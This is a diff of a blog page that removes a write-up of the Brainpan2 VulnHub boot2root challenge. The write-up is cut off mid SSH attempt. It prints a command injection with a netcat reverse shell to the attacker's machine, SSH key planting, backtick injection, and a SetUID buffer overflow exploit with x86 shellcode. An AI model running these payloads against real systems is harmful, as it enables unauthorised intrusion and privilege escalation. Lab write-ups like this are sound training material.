@@ -91,692 +91,520 @@
 		<div style='clear: both;'></div>
 	</div>
 	
+	<div style='clear: both;'></div>
+	<div id="outer-wrapper" class="index home">
 
-<div id="main">
-  <div id="content">
-    <div>
-      <article class="hentry" role="article">
+<div class='row' id='content-wrapper'>
+    <div id='main-wrapper'>
+      <div class='main section' id='main'>
+      
+
 
         
-        
 
-        <div class="entry-content">
-          
-          
-          
-          
 
-
-<figure class="img-responsive">
-    
-        <img src="/img/brainpan.jpg#left" />
-    
-    
-</figure>
-
-
-<p>Over on #vulnhub, there has been quite a chatter about <a href="http://vulnhub.com/entry/brainpan_2,56/">Brainpan2</a>, a &ldquo;sequel&rdquo; to Brainpan, by <a href="https://twitter.com/@superkojiman">superkojiman</a>. They&rsquo;re even offering a 50 GBP award to whoever submits the best write-up! Since I enjoy challenges like this, I took a look at the machine. However, the writeup had to wait until the contest was complete, so that people didn&rsquo;t cheat to win.</p>
-
-<!-- more -->
-
-<div style="clear:both;"></div>
-
-<h2 id="the-trolling-it-begins-early">The trolling, it begins early&hellip;</h2>
-
-<p>I imported the VM into VMWare Fusion, and started finding the host.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/brainpan2_vmware_booted.png" />
-    
-    
-</figure>
-
-
-<p>The first thing I had to do, was find it&rsquo;s IP. Many people use &lsquo;netdiscover&rsquo;, but I typically prefer just ping sweeping often. It can sometimes miss, but it works well for me.</p>
-
-<pre><code>➜  ~  nmap -sP 192.168.188.0/24
-
-Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:19 EST
-Nmap scan report for 192.168.188.1
-Host is up (0.00046s latency).
-Nmap scan report for 192.168.188.146
-Host is up (0.00061s latency).
-Nmap done: 256 IP addresses (2 hosts up) scanned in 3.14 seconds
-</code></pre>
-
-<p>From this, I now know the IP is 192.168.188.146 on my network, but will vary for each person playing this game.</p>
-
-<p>Next, I did a basic nmap scan to discover what services were on the machine.</p>
-
-<pre><code>➜  ~  nmap -sV 192.168.188.146
-
-Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:20 EST
-Nmap scan report for 192.168.188.146
-Host is up (0.0017s latency).
-Not shown: 998 closed ports
-PORT      STATE SERVICE VERSION
-9999/tcp  open  abyss?
-10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
-
-Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 37.38 seconds
-</code></pre>
-
-<p>This looked eerily similar to the original Brainpan vulnerable machine. Due to that, I started to attack it in a similar method. I ran &lsquo;dirb&rsquo; on the web server to see if there were any hidden files.</p>
-
-<pre><code>➜  dirb  ./dirb http://192.168.188.146:10000 wordlists/big.txt -S
-
------------------
-DIRB v2.03
-By The Dark Raver
------------------
-
-START_TIME: Wed Nov 20 16:22:36 2013
-URL_BASE: http://192.168.188.146:10000/
-WORDLIST_FILES: wordlists/big.txt
-OPTION: Silent Mode
-
------------------
-
-GENERATED WORDS: 4217
-
----- Scanning URL: http://192.168.188.146:10000/ ----
-+ http://192.168.188.146:10000//
-    (FOUND: 200 [Ok] - Size: 204)
-+ http://192.168.188.146:10000/bin
-    (FOUND: 301 [Moved Permanently] - Size: 0)
-
------------------
-DOWNLOADED: 4217 - FOUND: 2
-</code></pre>
-
-<p>Again, just like the previous challenge, there was a &lsquo;bin&rsquo; folder. I browsed to it, and saw a &lsquo;brainpan.exe&rsquo;. I had to double-check that I had downloaded the proper boot2root again!</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/brainpan2_firefox_bin_directory.png" />
-    
-    
-</figure>
-
-
-<p>I downloaded the file, and looked to see if it was still a Portable Executable, only to discover it was actually a JPEG.</p>
-
-<pre><code>➜  ~  wget http://192.168.188.146:10000/bin/brainpan.exe
---2013-11-20 16:25:15--  http://192.168.188.146:10000/bin/brainpan.exe
-Connecting to 192.168.188.146:10000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 18764 (18K) [application/x-msdos-program]
-Saving to: ‘brainpan.exe’
-
-100%[======================================&gt;] 18,764      --.-K/s   in 0.001s
-
-2013-11-20 16:25:15 (16.7 MB/s) - ‘brainpan.exe’ saved [18764/18764]
-
-➜  ~  file brainpan.exe
-brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &quot;CREATOR: gd-jpeg v1.0 (using IJ&quot;
-</code></pre>
-
-<p>I renamed the file to have a JPEG extension, and opened it, only to see that I&rsquo;d been trolled. I can sense a theme for this challenge&hellip;</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/brainpan2_preview.png" />
-    
-    
-</figure>
-
-
-<h2 id="getting-down-to-business">Getting down to business</h2>
-
-<p>Since the webserver seemed to be a dead end, I connected to the server on port 9999. It looked to be a terminal application that I could play with. I logged in as GUEST, and looked around to see the commands it would allow.</p>
-
-<pre><code>➜  ~  nc 192.168.188.146 9999
-_|                            _|
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
-_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|
-                                            _|
-
-[______________________ WELCOME TO BRAINPAN 2.0________________________]
-                             LOGIN AS GUEST
-
-                          &gt;&gt; GUEST
-                          ACCESS GRANTED
-
-
-                             *  *  *  *
-    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.
-    TYPE &quot;TELL ME MORE&quot; FOR A LIST OF COMMANDS.
-                             *  *  *  *
-
-
-                          &gt;&gt; TELL ME MORE
-    FILES    HELP    VIEW       CREATE
-    USERS    MSG     SYSTEM     BYE
-</code></pre>
-
-<p>I found that if I ran the &lsquo;FILES&rsquo; command, it would show me a file listing.</p>
-
-<pre><code>
-                          &gt;&gt; FILES
-total 36
--rwxr-xr-x 1 root   root   18424 Nov  4 15:17 brainpan.exe
--rw-r--r-- 1 root   root    1109 Nov  5 09:24 brainpan.txt
--rw-r--r-- 1 root   root     683 Nov  4 12:14 notes.txt
--rw-r--r-- 1 anansi anansi    12 Nov  5 09:16 test-1
--rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
-</code></pre>
-
-<p>If I then used the &lsquo;VIEW&rsquo; command, I could read those files.</p>
-
-<pre><code>-rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
-                          &gt;&gt; VIEW
-    ENTER FILE TO DOWNLOAD: test-2
-File create works.
-</code></pre>
-
-<p>After tinkering, I found that the &lsquo;VIEW&rsquo; command, would let me inject code, if I just prepended my commands with a semi-colon. It wasn&rsquo;t sanitizing the input very well.</p>
-
-<p>I setup a local listener on my MacBook (192.168.1.136).</p>
-
-<pre><code>➜  ~  nc -lv 1234
-</code></pre>
-
-<p>I then issued the &lsquo;VIEW&rsquo; command, and injected a connect-back command through netcat.</p>
-
-<pre><code>                          &gt;&gt; VIEW
-    ENTER FILE TO DOWNLOAD: ; /bin/nc.traditional -e /bin/sh 192.168.1.136 1234
-</code></pre>
-
-<p>The window just froze, so I went back to my netcat window to verify it was working. I issued the &lsquo;id&rsquo; command to test it. It was in fact working, and showed that I was able to execute commands as &lsquo;anansi&rsquo;.</p>
-
-<pre><code>id
-uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
-</code></pre>
-
-<p>I really wanted to upgrade this shell to a &lsquo;real&rsquo; shell, like over SSH, but the port scan before didn&rsquo;t show SSH running. On a hunch, I ran &lsquo;netstat&rsquo;, and I found the SSH server running on the &lsquo;127.0.1.1&rsquo; host, on port 2222. Checking the /etc/ssh/sshd_config file verified this configuration, albeit a bit odd.</p>
-
-<pre><code>netstat -antup
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
-tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      5382/brainpan.exe
-tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -
-tcp        0      0 192.168.188.146:50562   192.168.1.136:1234      ESTABLISHED 5522/sh
-tcp        0      0 192.168.188.146:9999    192.168.188.1:52622     ESTABLISHED 5382/brainpan.exe
-udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
-udp        0      0 0.0.0.0:7240            0.0.0.0:*                           -
-udp6       0      0 :::59406                :::*                                -
-</code></pre>
-
-<p>I added my MacBook&rsquo;s public key to the machine for the username &lsquo;anansi&rsquo;, since I didn&rsquo;t know the password. But first, I had to do a trick that <a href="https://twitter.com/@g0tmi1k">g0tmi1k</a> taught me to get a &lsquo;proper&rsquo; shell (the python).</p>
-
-<pre><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
-anansi@brainpan2:/opt/brainpan$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lycUor/c861GeARol7mufaGiXdWEi1NdR2F1iNJKr/2SwbkpBnmsKr+2ko8wk+x2KQzPHkNNNoTO3BUsc1BvInyLlTqmi9L3EjVBxmeprKVIUX/2jLC4wh1V4UVSODU+DCzu1OiNfFos1Tto28p/ZA6mTPm4WrcH5rFTpnzUagS+4EpuPlBjOOCIjL2cphpFV+TvbbFrWyGtB9LIDXajx9Dw5wsyI7SyCIwpgG9zBzg2WuYf5OQcKcSB+OgEzXy2tWTT4og98EI4A26FZ9EdvvwJATQ3gvkmGKh913PvU3528gDt7R5DnkaCHt6hVCaa9JOR5b/W9DCCDGjcw31j mandreko@420-sc02j364hdkq5-man&quot; &gt; ~/.ssh/authorized_keys
-anansi@brainpan2:/opt/brainpan$ chmod 600 ~/.ssh/authorized_keys
-</code></pre>
-
-<p>Now, I just had to figure out a way to access the &lsquo;127.0.1.1:2222&rsquo; port from my MacBook, so I could get a real SSH connection. I managed to use a reverse SSH tunnel to complete this.</p>
-
-<pre><code>anansi@brainpan2:/opt/brainpan$ ssh mandreko@192.168.1.136 -R 9876:127.0.1.1:2222
-&lt;pan$ ssh mandreko@192.168.1.136 -R 9876:127.0.1.1:2222
-Password:&lt;redacted&gt;
-
-Last login: Wed Nov 20 16:44:34 2013
-</code></pre>
-
-<p>Now, in a third terminal window, I was able to SSH in.</p>
-
-<pre><code>➜  ~  ssh anansi@localhost -p 9876
-Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Tue Nov  5 09:13:28 2013
-anansi@brainpan2:~$
-</code></pre>
-
-<p>I figured the next step would be to escalate my privileges, so I started looking for programs that were SetUID, meaning that when they ran, they ran under the privileges of the user that owned them. I found one, in another user&rsquo;s home folder, which I was conveniently able to view.</p>
-
-<pre><code>anansi@brainpan2:~$ find / -perm -u=s -type f 2&gt;/dev/null
-/usr/sbin/exim4
-/usr/bin/chfn
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/procmail
-/usr/bin/gpasswd
-/usr/bin/at
-/usr/bin/newgrp
-/usr/lib/pt_chown
-/usr/lib/openssh/ssh-keysign
-/usr/lib/eject/dmcrypt-get-device
-/bin/umount
-/bin/ping
-/bin/mount
-/bin/ping6
-/bin/su
-/home/reynard/msg_root
-anansi@brainpan2:~$ cd /home/reynard
-anansi@brainpan2:/home/reynard$ ls -al
-total 44
-drwxr-xr-x 3 reynard reynard 4096 Nov  7 09:54 .
-drwxr-xr-x 5 root    root    4096 Nov  4 10:57 ..
--rw------- 1 reynard reynard    0 Nov  7 09:54 .bash_history
--rw-r--r-- 1 reynard reynard  220 Nov  4 10:57 .bash_logout
--rw-r--r-- 1 reynard reynard 3392 Nov  4 10:57 .bashrc
--rwsr-xr-x 1 root    root    8999 Nov  6 17:10 msg_root
--rw-r--r-- 1 reynard reynard  675 Nov  4 10:57 .profile
--rw-r--r-- 1 reynard reynard  154 Nov  5 23:20 readme.txt
--rwxr-xr-x 1 reynard reynard  137 Nov  4 19:59 startweb.sh
-drwxr-xr-x 3 reynard reynard 4096 Nov  4 19:32 web
-</code></pre>
-
-<p>I read the &lsquo;readme.txt&rsquo; file, and attempted to use the tool as it was designed first. It seemed to work.</p>
-
-<pre><code>anansi@brainpan2:/home/reynard$ cat readme.txt
-msg_root is a quick way to send a message to the root user.
-Messages are written to /tmp/msg.txt
-
-usage:
-msg_root &quot;username&quot; &quot;this message is for root&quot;
-anansi@brainpan2:/home/reynard$ ./msg_root &quot;test&quot; &quot;test&quot;
-Your message is test
-anansi@brainpan2:/home/reynard$ cat /tmp/msg.txt
-test: test
-</code></pre>
-
-<p>I figured the next step would be to try to overflow one of the buffers. I tried the first argument first, and it crashed.</p>
-
-<pre><code>anansi@brainpan2:/home/reynard$ ./msg_root $(perl -e 'print &quot;A&quot;x100') hi
-Segmentation fault
-</code></pre>
-
-<p>In a temporary terminal on my MacBook, I ran Metasploit&rsquo;s &lsquo;pattern_create.rb&rsquo;, to create a unique pattern.</p>
-
-<pre><code>➜  tools git:(master) ✗ ./pattern_create.rb 100
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-</code></pre>
-
-<p>I then used this as the first argument, to get the address that overwrote the EIP.</p>
-
-<pre><code>anansi@brainpan2:/home/reynard$ gdb ./msg_root --quiet
-Reading symbols from /home/reynard/msg_root...done.
-(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A hi
-Starting program: /home/reynard/msg_root Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A hi
-
-Program received signal SIGSEGV, Segmentation fault.
-0x35614134 in ?? ()
-</code></pre>
-
-<p>In the temporary terminal, I then plugged the value into the &lsquo;pattern_offset.rb&rsquo; tool to find the offset to the EIP. It turns out it was quite short, only 14 bytes.</p>
-
-<pre><code>➜  tools git:(master) ✗ ./pattern_offset.rb 0x35614134
-[*] Exact match at offset 14
-</code></pre>
-
-<p>To verify this, I setup a skeleton command to run as an exploit. I was able to verify that 14 bytes were in fact the offset, since the &ldquo;B&rdquo;x4 showed up as 0x42424242, their hex equivilent.</p>
-
-<pre><code>(gdb) run $(perl -e 'print &quot;A&quot;x14 . &quot;B&quot;x4 . &quot;C&quot;x100') hi
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /home/reynard/msg_root $(perl -e 'print &quot;A&quot;x14 . &quot;B&quot;x4 . &quot;C&quot;x100') hi
-
-Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-</code></pre>
-
-<p>I figured the next two steps were to find an address to return to, be it a &lsquo;jmp esp&rsquo;, or something useful. Since this was a local linux application, however, I found I could just put the shellcode in memory as an environment variable, and then jump directly to the address. I started off by finding some shellcode I&rsquo;d used in the past, which would run /bin/sh, and setting it to an environment variable with a little NOP sled.</p>
-
-<pre><code>anansi@brainpan2:/home/reynard$ export SHELLCODE=$(perl -e 'print &quot;\x90&quot;x32 . &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;')
-</code></pre>
-
-<p>All I needed now was to find the address of this environmental variable. I used a tool from &lsquo;Hacking: The Art of Exploitation&rsquo;, one of my favorite books for this stuff. Since there was no &lsquo;gcc&rsquo; on Brainpan2, I had to compile the tool on a local linux machine (I used a Kali VM), and then download it to the Brainpan VM.</p>
-
-<pre><code>root@kali:~# cat &gt; getenvaddr.c &lt;&lt; EOF
-&gt; #include &lt;stdio.h&gt;
-&gt; #include &lt;stdlib.h&gt;
-&gt; #include &lt;string.h&gt;
-&gt; 
-&gt; int main(int argc, char *argv[]) {
-&gt;         char *ptr;
-&gt;         if(argc &lt; 3) {
-&gt;                 printf(&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;, argv[0]);
-&gt;                 exit(0);
-&gt;         }
-&gt; 
-&gt;         ptr = getenv(argv[1]); /* Get env var location. */
-&gt;         ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
-&gt;         printf(&quot;%s will be at %p\n&quot;, argv[1], ptr);
-&gt; }
-&gt; EOF
-root@kali:~# gcc -o getenvaddr getenvaddr.c 
-root@kali:~# mv getenvaddr /var/www
-root@kali:~# service apache2 start
-[....] Starting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
-. ok 
-root@kali:~# ifconfig eth0
-eth0      Link encap:Ethernet  HWaddr 00:0c:29:0d:d8:41  
-          inet addr:192.168.188.138  Bcast:192.168.188.255  Mask:255.255.255.0
-          inet6 addr: fe80::20c:29ff:fe0d:d841/64 Scope:Link
-          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-          RX packets:17 errors:16 dropped:0 overruns:0 frame:0
-          TX packets:28 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:1000 
-          RX bytes:2033 (1.9 KiB)  TX bytes:2370 (2.3 KiB)
-          Interrupt:19 Base address:0x2024 
-</code></pre>
-
-<pre><code>anansi@brainpan2:/home/reynard$ wget http://192.168.188.138/getenvaddr -O /tmp/getenvaddr
---2013-11-20 17:16:26--  http://192.168.188.138/getenvaddr
-Connecting to 192.168.188.138:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 5336 (5.2K)
-Saving to: `/tmp/getenvaddr'
-
-100%[=========================================================================&gt;] 5,336       --.-K/s   in 0s
-
-2013-11-20 17:16:26 (582 MB/s) - `/tmp/getenvaddr' saved [5336/5336]
-anansi@brainpan2:/home/reynard$ chmod +x /tmp/getenvaddr
-</code></pre>
-
-<p>After saving the file to a temp directory, I executed it, to give me the address of &lsquo;SHELLCODE&rsquo; in memory.</p>
-
-<pre><code>anansi@brainpan2:/home/reynard$ /tmp/getenvaddr SHELLCODE ./msg_root
-SHELLCODE will be at 0xbffff91a
-</code></pre>
-
-<p>I then plugged the value into my skeleton exploit, and ran it.</p>
-
-<pre><code>anansi@brainpan2:/home/reynard$ ./msg_root $(perl -e 'print &quot;A&quot;x14 . &quot;\x1a\xf9\xff\xbf&quot;') hi
-$ id
-uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
-</code></pre>
-
-<p>At this point, I saw that I was &lsquo;root&rsquo;, and prepared to gloat about my victory in #vulnhub. I however missed one thing.</p>
-
-<h2 id="the-fake-out">The fake out</h2>
-
-<p>If you look really carefully at the &lsquo;id&rsquo; command, you&rsquo;ll see that the euid is &lsquo;104&rsquo;, and the groupid is &lsquo;106&rsquo;. This is not the norm, as &lsquo;root&rsquo; is usually &lsquo;0&rsquo; and &lsquo;0&rsquo;. I also noticed that my prompt was still &lsquo;$&rsquo;, versus the usual &lsquo;#&rsquo; root prompt. I however, went along my way. I went to &lsquo;/root&rsquo;, to see if there was some sort of flag, or something fun like are often found in these challenges. I saw there indeed was one, so I tried to read it.</p>
-
-<pre><code>$ cd /root
-$ ls -al
-total 28
-drwx------  3 root  root  4096 Nov  5 09:56 .
-drwxr-xr-x 22 root  root  4096 Nov  5 07:09 ..
-drwx------  2 root  root  4096 Nov  4 10:08 .aptitude
--rw-------  1 root  root     0 Nov  5 09:57 .bash_history
--rw-r--r--  1 root  root   589 Nov  5 09:56 .bashrc
--rw-r--r--  1 root  root   159 Nov  5 09:56 .profile
--rw-------  1 root  root   461 Nov  5 09:48 flag.txt
--rw-------  1 root  root   245 Nov  5 09:47 whatif.txt
-$ cat flag.txt
-cat: flag.txt: Permission denied
-</code></pre>
-
-<p>The &lsquo;Permission denied&rsquo; really confused me for a minute. How was it that the &lsquo;root&rsquo; user, the most god-like user on a UNIX system, would be unable to read a text file? I next read the &lsquo;whatif.txt&rsquo; file.</p>
-
-<pre><code>$ cat whatif.txt
-
-       WHAT IF I TOLD YOU
-              ___
-            /     \
-           | ______\
-          (, \_/ \_/
-           |   ._. |
-           \   --- /
-           /`-.__.'
-      .---'`-.___|\___
-     /                `.
-
-       YOU ARE NOT ROOT?
-
-</code></pre>
-
-<p>This is yet another troll from <a href="https://twitter.com/@superkojiman">superkojiman</a>, who is a complete bastard. Going on this information, I decided to check out the system password file to see what was up.</p>
-
-<pre><code>$ cat /etc/passwd
-root:x:104:106:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-news:x:9:9:news:/var/spool/news:/bin/sh
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-root :x:0:0:root:/var/root:/bin/bash
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-Debian-exim:x:101:103::/var/spool/exim4:/bin/false
-statd:x:102:65534::/var/lib/nfs:/bin/false
-sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
-anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash
-puck:x:1001:1001:puck,,,:/home/puck:/bin/bash
-reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash
-</code></pre>
-
-<p>The one thing that stood out to me, was that I was using the &lsquo;root&rsquo; user, but the original &lsquo;root&rsquo; user had been renamed to &lsquo;root &rsquo; (notice the space at the end). This was also the same point that my brain almost shut down.</p>
-
-<p>Figuring I&rsquo;d have to escalate yet again, I looked around for more SetUID binaries.</p>
-
-<pre><code>$ find / -perm -u=s -type f 2&gt;/dev/null
-/opt/old/brainpan-1.8/brainpan-1.8.exe
-/usr/sbin/exim4
-/usr/bin/chfn
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/procmail
-/usr/bin/gpasswd
-/usr/bin/at
-/usr/bin/newgrp
-/usr/lib/pt_chown
-/usr/lib/openssh/ssh-keysign
-/usr/lib/eject/dmcrypt-get-device
-/bin/umount
-/bin/ping
-/bin/mount
-/bin/ping6
-/bin/su
-/home/reynard/msg_root
-</code></pre>
-
-<p>This time around, there was a new binary, &lsquo;/opt/old/brainpan-1.8/brainpan-1.8.exe&rsquo;. I went into the folder, and poked around to see what else was there.</p>
-
-<pre><code>$ cd /opt/old/brainpan-1.8
-$ ls -al
-total 36
-drwxrwxr-x 2 root  staff  4096 Nov  5 09:25 .
-drwx------ 3 root  root   4096 Nov  4 10:28 ..
--rwsr-xr-x 1 puck  puck  17734 Nov  4 14:37 brainpan-1.8.exe
--rw-r--r-- 1 puck  puck   1227 Nov  5 09:24 brainpan.7
--rw-rw-rw- 1 puck  staff    27 Nov  5 09:25 brainpan.cfg
-</code></pre>
-
-<p>Remembering back to when I was logged into the initial terminal application, I had read in the &lsquo;notes.txt&rsquo; file, that version 1.8 was playing with reading in a config from a file, but that was scrapped in the 1.9 version that I had been using. This older version though, still had it. I read the &lsquo;brainpan.cfg&rsquo; file, to see that it would only run locally. I however wanted it to run on the public interface, so I could access it in a fourth terminal window conveniently. I modified the configuration, and started the service.</p>
-
-<pre><code>$ echo &quot;port=9333\nipaddr=0.0.0.0&quot; &gt; brainpan.cfg
-$ cat brainpan.cfg
-port=9333
-ipaddr=0.0.0.0
-$ ./brainpan-1.8.exe
-port = 9333
-ipaddr = 0.0.0.0
-+ bind done
-+ waiting for connections...
-
-</code></pre>
-
-<p>I opened a fourth terminal window on my MacBook, and connected to the service. It looked very similar to the newer version, however most of the commands wouldn&rsquo;t work.</p>
-
-<pre><code>➜  ~  nc 192.168.188.146 9333
-_|                            _|
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
-_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|
-                                            _|
-
-[______________________ WELCOME TO BRAINPAN 1.8________________________]
-                             LOGIN AS GUEST
-
-                          &gt;&gt; GUEST
-                          ACCESS GRANTED
-
-
-                             *  *  *  *
-    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.
-    TYPE &quot;TELL ME MORE&quot; FOR A LIST OF COMMANDS.
-                             *  *  *  *
-
-
-                          &gt;&gt; TELL ME MORE
-    FILES    HELP    VIEW       CREATE
-    USERS    MSG     SYSTEM     BYE
-
-                          &gt;&gt; FILES
-    WHAT?
-                          &gt;&gt; HELP
-    WHAT?
-                          &gt;&gt; CREATE
-    WHAT?
-                          &gt;&gt; USERS
-    NOT YET SUPPORTED
-                          &gt;&gt; MSG
-    NOT YET SUPPORTED
-                          &gt;&gt; SYSTEM
-    NOT AVAILABLE TO GUEST ACCOUNT
-</code></pre>
-
-<p>The only one that seemed to work, was &lsquo;VIEW&rsquo;. I tried to exploit it the same was as before, but it just hung the application.</p>
-
-<pre><code>                          &gt;&gt; VIEW
-    ENTER FILE TO DOWNLOAD: ; ls
-</code></pre>
-
-<p>I played around a bit, and noticed that if I used backticks, I could execute some code, and it appeared to display the output to my screen. I figured I&rsquo;d try to add my SSH public key again to see if it worked.</p>
-
-<pre><code>                          &gt;&gt; VIEW
-    ENTER FILE TO DOWNLOAD: `echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lycUor/c861GeARol7mufaGiXdWEi1NdR2F1iNJKr/2SwbkpBnmsKr+2ko8wk+x2KQzPHkNNNoTO3BUsc1BvInyLlTqmi9L3EjVBxmeprKVIUX/2jLC4wh1V4UVSODU+DCzu1OiNfFos1Tto28p/ZA6mTPm4WrcH5rFTpnzUagS+4EpuPlBjOOCIjL2cphpFV+TvbbFrWyGtB9LIDXajx9Dw5wsyI7SyCIwpgG9zBzg2WuYf5OQcKcSB+OgEzXy2tWTT4og98EI4A26FZ9EdvvwJATQ3gvkmGKh913PvU3528gDt7R5DnkaCHt6hVCaa9JOR5b/W9DCCDGjcw31j mandreko@420-sc02j364hdkq5-man&quot; &gt; /home/puck/.ssh/authorized_keys;chmod 600 /home/puck/.ssh/authorized_keys`
-</code></pre>
-
-<p>It again hung, but when I attempted to login in a fifth terminal screen, it worked like a charm.</p>
-
-<pre><code>➜  ~  ssh puck@localhost -p 9876
-Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-puck@brainpan2:~$
-</code></pre>
-
-<h2 id="always-secure-your-backups">Always secure your backups</h2>
-
-<p>I figured, based on the trolling, I&rsquo;d find yet another program to exploit. However, I saw no files in the home directory for &lsquo;puck&rsquo;. When I looked at hidden files, I found all of the normal files you&rsquo;d expect, plus a &lsquo;.backup&rsquo; folder.</p>
-
-<pre><code>puck@brainpan2:~$ ls -al
-total 28
-drwx------ 4 puck  puck  4096 Nov  5 09:45 .
-drwxr-xr-x 5 root  root  4096 Nov  4 10:57 ..
-drwxr-xr-x 3 puck  puck  4096 Nov  5 09:44 .backup
--rw------- 1 puck  puck     0 Nov  5 09:28 .bash_history
--rw-r--r-- 1 puck  puck   220 Nov  4 10:54 .bash_logout
--rw-r--r-- 1 puck  puck  3392 Nov  4 10:54 .bashrc
--rw-r--r-- 1 puck  puck   675 Nov  4 10:54 .profile
-drwx------ 2 puck  puck  4096 Nov 20 17:35 .ssh
-</code></pre>
-
-<p>I started reading through all the files, especially the &lsquo;.bash_history&rsquo;. It looks like normal commands. He even would ssh locally when he&rsquo;d do things as &lsquo;root&rsquo;, since &lsquo;sudo&rsquo; wasn&rsquo;t installed. I figured that I would try doing the same, to see if his key was in the &lsquo;authorized_keys&rsquo; file for the &lsquo;root&rsquo; user. No dice, it didn&rsquo;t work and was asking me for a password.</p>
-
-<pre><code>puck@brainpan2:~$ ssh root@127.0.1.1 -p2222
-The authenticity of host '[127.0.1.1]:2222 ([127.0.1.1]:2222)' can't be established.
-ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
-Are you sure you want to continue connecting (yes/no)? yes
